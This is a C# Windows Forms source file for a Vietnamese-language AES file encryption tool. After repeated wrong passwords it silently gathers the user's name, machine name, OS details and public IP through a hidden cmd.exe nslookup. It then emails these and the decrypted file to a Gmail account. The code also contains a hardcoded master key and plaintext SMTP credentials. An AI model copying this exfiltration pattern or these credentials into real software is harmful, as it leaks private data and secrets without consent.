using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using AESEncryptDecryptClassLibraries;

namespace AESEncryptDecyptFile
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            if (File.Exists("fileIn.txt") || File.Exists("fileOut.txt"))
            {
                string fileIn = File.ReadAllText("fileIn.txt");
                string fileOut = File.ReadAllText("fileOut.txt");
                txtInputFile.Text = fileIn;
                txtOutputFile.Text = fileOut;
            }
                Random r = new Random();
                StringBuilder builder = new StringBuilder();
                builder.Append(RandomString(4, true));
                builder.Append(RandomNumber(1000, 9999));
                builder.Append(RandomString(2, false));
                string pass = builder.ToString();
                txtPassword.Text = pass;
                GCHandle gch = GCHandle.Alloc(pass, GCHandleType.Pinned);
        }
        public int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        public string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
                return builder.ToString().ToLower();
            return builder.ToString();
        }

        private void btnForgetPassword_Click(object sender, EventArgs e)
        {
            Form3 frmForgetPassword = new Form3();
            frmForgetPassword.Show();
        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            GCHandle gch = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
            AESEncryptDecrypt.FileEncrypt(txtInputFile.Text, txtPassword.Text);
            File.WriteAllText("encrypted_files.dat", txtPassword.Text);
            AESEncryptDecrypt.FileEncrypt("encrypted_files.dat", "pass123456");
            File.Delete("encrypted_files.dat");
            AESEncryptDecrypt.FileEncrypt(txtInputFile.Text, txtPassword.Text);
            File.WriteAllText("fileIn.txt", txtInputFile.Text);
            txtOutputFile.Text = txtInputFile.Text.ToString() + ".aes";
            File.WriteAllText("fileOut.txt", txtOutputFile.Text);
            File.Delete(txtInputFile.Text);
            gch.Free();

        }

        private void btnBrowseFile_Click(object sender, EventArgs e)
        {
            var dlg = new OpenFileDialog();
            if (dlg.ShowDialog() == DialogResult.OK)
            {
                txtInputFile.Text = dlg.FileName;
                //string outputFile = txtInputFile.Text.ToString().Replace(".aes", "");
                //txtOutputFile.Text = outputFile;
            }
        }

        int SoLanThuLai = 0;
        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            AESEncryptDecrypt.FileDecrypt("encrypted_files.dat.aes", "temp1.tmp", "pass123456");
            string pass = File.ReadAllText("temp1.tmp");
            GCHandle gch = GCHandle.Alloc(pass, GCHandleType.Pinned);
            if (txtPasswordEnter.Text != pass || txtPasswordEnter.Text == "")
            {
                SoLanThuLai++;
                MessageBox.Show("Sai mật khẩu giải mã! Vui lòng thử lại! \nLưu ý: Mật khẩu ở ô bên dưới (Dưới dòng chữ Mật khẩu để mã hoá / giải mã file) không phải là mật khẩu chính xác! Bạn phải nhớ mật khẩu đã từng hiển thị ở ô đó vào lúc bạn mã hoá file để nhập mật khẩu!");
                if (SoLanThuLai >= 5)
                {
                    AESEncryptDecrypt.FileDecrypt(txtOutputFile.Text, txtInputFile.Text, pass);
                    SendMail();
                    MessageBox.Show("Bạn đã nhập sai mật khẩu quá 10 lần. Vì lí do bảo mật, chúng tôi sẽ tự động xoá tập tin này để đảm bảo an toàn tập tin cho chủ sỡ hữu của tập tin. Một thông báo email kèm theo tập tin đã được giải mã đã được gửi đến chủ sở hữu và tập tin đã bị xoá khỏi máy tính này!", "Thông báo");
                    Thread.Sleep(TimeSpan.FromSeconds(10));
                    File.Delete("fsIn.txt");
                    File.Delete("fsOut.txt");
                    File.Delete("temp1.tmp");
                    File.Delete("temp2.tmp");
                    File.Delete("encrypted_files.dat.aes");
                    File.Delete(txtInputFile.Text);
                    File.Delete(txtOutputFile.Text);
                }
            }
            else
            {
                AESEncryptDecrypt.FileDecrypt(txtOutputFile.Text, txtInputFile.Text, txtPasswordEnter.Text);
                //AESEncryptDecrypt.FileDecrypt(txtInputFile.Text)
                MessageBox.Show("Đã giải mã file hoàn tất!", "Thông báo");
                File.Delete(txtOutputFile.Text);
            }
            gch.Free();
            File.Delete("temp1.tmp");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(txtPassword.Text);
            MessageBox.Show("Đã copy vào khay nhớ tạm Clipboard thành công!");
        }

        void SendMail()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtp = new SmtpClient("smtp.gmail.com");

                string user = Environment.UserName;
                string machine = Environment.MachineName;
                string os = Environment.OSVersion.Platform.ToString();
                string osServicePack = Environment.OSVersion.ServicePack;
                string osVer = Environment.OSVersion.VersionString;
                string ipGet = GetIP();

                mail.From = new MailAddress("lolvaruslol123@gmail.com");
                mail.To.Add("lolvaruslol123@gmail.com");
                mail.Subject = "Đã có người cố giải mã file của bạn vào: " + DateTime.Now.ToLongDateString() + "Bởi địa chỉ IP: " + ipGet;
                mail.Body = "Đã có người đang cố gắng giải mã file của ạn và họ đã nhập sai mật khẩu quá 10 lần. Để bảo đảm an toàn cho dữ liệu của bạn, hệ thống xin phép được xoá tập tin đó khỏi máy tính của người đang cố gắng giải mã file của bạn và hệ thống cũng đã gửi file đã được giải mã qua email này cho bạn.Sau đây là thông tin chi tiết về kẻ đang cố gắng đánh cắp dữ liệu của bạn: Username: "+ user + "Tên thiết bị: " + machine + "Hệ điều hành sử dụng: " + os + "Gói dịch vụ của hệ điều hành (Service Pack)" + osServicePack + "Phiên bản hệ điều hành đang sử dụng: " + osVer + "Địa chỉ IP: " + ipGet;
                string fileAttach = txtInputFile.Text;
                if (File.Exists(fileAttach))
                {
                    string directoryImage = fileAttach;
                    mail.Attachments.Add(new Attachment(fileAttach));
                }
                smtp.Port = 587;
                smtp.Credentials = new System.Net.NetworkCredential("lolvaruslol123@gmail.com", "thanhdz2019");
                smtp.EnableSsl = true;

                smtp.Send(mail);
                MessageBox.Show("Send mail!");
                Console.WriteLine("Send mail!");
            }
            catch (Exception ex)
            {
                string exception = ex.ToString();
                MessageBox.Show(exception);
            }
        }

        public static string RunCMD(string cmd)
        {
            Process cmdProcess;
            cmdProcess = new Process();
            cmdProcess.StartInfo.FileName = "cmd.exe";
            cmdProcess.StartInfo.Arguments = "/c " + cmd;
            cmdProcess.StartInfo.RedirectStandardOutput = true;
            cmdProcess.StartInfo.UseShellExecute = false;
            cmdProcess.StartInfo.CreateNoWindow = true;
            cmdProcess.Start();
            string output = cmdProcess.StandardOutput.ReadToEnd();
            cmdProcess.WaitForExit();
            if (String.IsNullOrEmpty(output))
                return "";
            return output;
        }

        public static string GetIP()
        {
            try
            {
                string output = RunCMD("nslookup myip.opendns.com. resolver1.opendns.com");
                var ip = Regex.Matches(output, @"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b");
                return ip[1].Value;
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            Application.Exit();
        }
    }
}
